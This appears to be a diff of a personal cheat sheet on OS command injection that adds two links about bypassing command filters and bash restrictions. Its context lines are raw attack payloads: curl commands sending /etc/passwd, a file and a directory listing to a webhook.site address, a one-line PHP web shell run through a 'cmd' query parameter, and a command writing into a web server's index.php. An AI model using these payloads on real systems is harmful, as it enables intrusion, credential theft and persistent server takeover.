@@ -8,6 +8,8 @@ curl -d @/output.txt https://webhook.site/54622bd8-cae3-4262-986d-441c42250814
 curl -d @/etc/passwd https://webhook.site/54622bd8-cae3-4262-986d-441c42250814
 curl --data $(ls /) https://webhook.site/54622bd8-cae3-4262-986d-441c42250814
 
+https://viblo.asia/p/bypass-os-command-injection-XL6lA4rNZek
+https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions
 echo `ls /`           //`....` "   run code in "
 <?php die(`$_GET['cmd']`);?>; 
 echo $(ls /) >> /var/www/html/index.php
